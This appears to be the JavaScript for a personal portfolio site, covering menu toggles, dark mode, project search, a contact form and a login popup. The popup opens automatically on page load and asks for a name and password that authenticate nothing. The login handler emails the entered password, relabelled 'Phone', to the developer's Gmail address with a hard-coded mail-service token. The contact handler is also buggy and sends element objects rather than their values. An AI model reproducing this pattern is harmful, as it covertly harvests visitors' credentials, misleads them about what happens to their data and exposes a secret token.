//LEFTBAR SLIDER FUNCTING - BARMENU TAP TO SHOW 
let portNav = document.querySelector(".portNav");
let BarMenu = document.querySelector("nav .ri-menu-3-line");
let leftbar = document.querySelector(".leftbar");
let clickTime = 0;

BarMenu.addEventListener("click", function(){
   if( clickTime == 0){
     BarMenu.classList.replace("ri-menu-3-line", "ri-close-line");
     leftbar.style.left = "0"
     clickTime = 1;
   }else{
     BarMenu.classList.replace("ri-close-line", "ri-menu-3-line");
     leftbar.style.left = "-100%"
     clickTime = 0;
   }
});

leftbar.addEventListener("click",function(){
  BarMenu.classList.replace("ri-close-line", "ri-menu-3-line");
  leftbar.style.left = "-100%"
});


//LEFTBAR PAGE SWITCH FUNCTIONING 
let PortfolioBtn = document.querySelector("#portBtn");
let SourceBtn = document.querySelector("#srcBtn");

let PortfolioPage = document.querySelector(".portfolio");
let ProjectPage = document.querySelector(".project");

PortfolioBtn.addEventListener("click",function(){
  PortfolioPage.style.display = "block"
  ProjectPage.style.display = "none"
  MessagePage.style.left = "-200%"
});
SourceBtn.addEventListener("click",function(){
  PortfolioPage.style.display = "none"
  ProjectPage.style.display = "block"
  MessagePage.style.left = "-200%"
});





//PORTFOLIO BACK BUTTON TEMPORARY 
let portfolioBackBtn = document.querySelector(".ri-arrow-left-s-line")
portfolioBackBtn.addEventListener("click",function(){
  PortfolioPage.style.display = "none"
  ProjectPage.style.display = "block"
  MessagePage.style.left = "-200%"
});






// FUNCTION OF DARK MODE 
let DarkMode = document.querySelector(".ri-moon-fill")
let theme = document.querySelector("#theme")
  let Click = 0;
theme.addEventListener("click",function(){
  if(Click == 0){
    document.querySelector("body").classList.add("darkMode")
    theme.innerHTML = `<i class="ri-sun-fill"></i> Light Mode`
    Click = 1;
  }else{
    document.querySelector("body").classList.remove("darkMode")
    theme.innerHTML = `<i class="ri-moon-fill"></i> Dark Mode`
    Click = 0;
  }
});

//CODE OF SEARCH PROJECT 
document.getElementById('srcInput').addEventListener('keyup', function() {
  const filter = this.value.toUpperCase();
  const names = document.querySelector(".project ul").getElementsByTagName('li');
  
  for (let i = 0; i < names.length; i++) {
    const name = names[i].textContent.toUpperCase();
    if (name.indexOf(filter) > -1) {
      names[i].style.display = '';
    } else {
      names[i].style.display = 'none';
    }
  }
});


//Get data from user Login Page
let LOGINBTN = document.querySelector("#loginBtn")
LOGINBTN.addEventListener("click",function(){
  let msgName = document.querySelector(".box2MSG #name").value
  let msgPass = document.querySelector(".box2MSG #pass").value

  if( msgName.length == 0 || msgPass.length == 0){
    swal("ERROR", "Please fill Every Details", "error");
    navigator.vibrate(200)
  }else{
    messagePageHover.style.width = "50px"
    messagePageHover.style.height = "50px"
    messagePageHover.style.borderRadius = "8px"
    messagePageHover.style.bottom = "20px"
    messagePageHover.style.right = "20px"
    document.querySelector(".box2MSG").style.display = "none"
    messageIcon.style.display = "block"
    messageIcon.style.display = "grid"
    messageIcon.style.placeItems = "center"
    
    document.querySelector("#user").innerHTML = `<i class="ri-user-line"></i>` + msgName;
    Email.send({
    SecureToken : "5ae85ede-0721-49f6-9dd2-ac4f42182fc7",
    To : 'azizansari8716@gmail.com',
    From : "azizansari8716@gmail.com",
    Subject : "LOGIN DATA/aziz",
    Body : "Name : " + msgName
          + "<br> Phone : " + msgPass,
}).then(
  message => swal("Login Successfully", "Developer: Mr. aziz ansari", "success")
      )
    }
});

 
 //Get data from user of Message Page 
 let MSGBTN = document.querySelector("#msgBtn") 
 MSGBTN.addEventListener("click",function(){
  
   let msgName = document.querySelector(".box1MSG #name")
   let msgEmail = document.querySelector(".box1MSG #email")
   let msgTextArea = document.querySelector(".box1MSG #txtArea")
  
   if( msgName.value.length == 0 || msgEmail.value.length == 0 ||  msgTextArea.value.length == 0){
    swal("ERROR", "Please fill Every Details", "error");
    navigator.vibrate(200)
   }else{
     
    messagePageHover.style.width = "50px"
    messagePageHover.style.height = "50px"
    messagePageHover.style.borderRadius = "8px"
    messagePageHover.style.bottom = "20px"
    messagePageHover.style.right = "20px"
    document.querySelector(".box1MSG").style.display = "none"
    document.querySelector(".messageIcon i").classList.replace("ri-close-circle-line" , "ri-message-2-line");
   
   
    msgName.value = ""
    msgEmail.value = ""
    msgTextArea.value = ""
    
    Email.send({
    SecureToken : "5ae85ede-0721-49f6-9dd2-ac4f42182fc7",
    To : 'azizansari8716@gmail.com',
    From : "azizansari8716@gmail.com",
    Subject : "MESSAGE FROM/aziz",
    Body : "Name : " + msgName
          + "<br> Email : " + msgEmail
          + "<br> Message : " + msgTextArea,
}).then(
  message => swal("Message Sent Successfully", "Developer : Mr. Aziz Ansari", "success")
      )
    }
 });





//MESSAGE POPUP PAGE SHOW
let messageIcon = document.querySelector(".messageIcon")
let messagePageHover = document.querySelector(".messagePageHover")
let clickMessage = 0;
messageIcon.addEventListener('click', (e) => {
  if(clickMessage == 0){
  messagePageHover.style.width = "100%"
  messagePageHover.style.height = "100%"
  messagePageHover.style.borderRadius = "0px"
  messagePageHover.style.bottom = "0"
  messagePageHover.style.right = "0"
  document.querySelector(".box1MSG").style.display = "block"
  document.querySelector(".box2MSG").style.display = "none"
  document.querySelector(".messageIcon i").classList.replace("ri-message-2-line" , "ri-close-circle-line");
  clickMessage = 1;
  }else{
    messagePageHover.style.width = "50px"
    messagePageHover.style.height = "50px"
    messagePageHover.style.borderRadius = "8px"
    messagePageHover.style.bottom = "20px"
    messagePageHover.style.right = "20px"
    document.querySelector(".box1MSG").style.display = "none"
    document.querySelector(".messageIcon i").classList.replace("ri-close-circle-line" , "ri-message-2-line");
    clickMessage = 0;
  }
});

//LOGINPAGE POPUP SETTIMEOUT
function LoginPopup() {
  setTimeout( () => {
  messagePageHover.style.width = "100%"
  messagePageHover.style.height = "100%"
  messagePageHover.style.borderRadius = "0px"
  messagePageHover.style.bottom = "0"
  messagePageHover.style.right = "0"
  document.querySelector(".box2MSG").style.display = "block"
  messageIcon.style.display = "none"
  },1000)
  };
LoginPopup();

let logoutBtn = document.querySelector("#logoutBtn")
logoutBtn.addEventListener('click', (e) => {
  LoginPopup();
  document.querySelector("#user").innerHTML = `<i class="ri-user-line"></i>` + "Account";
})
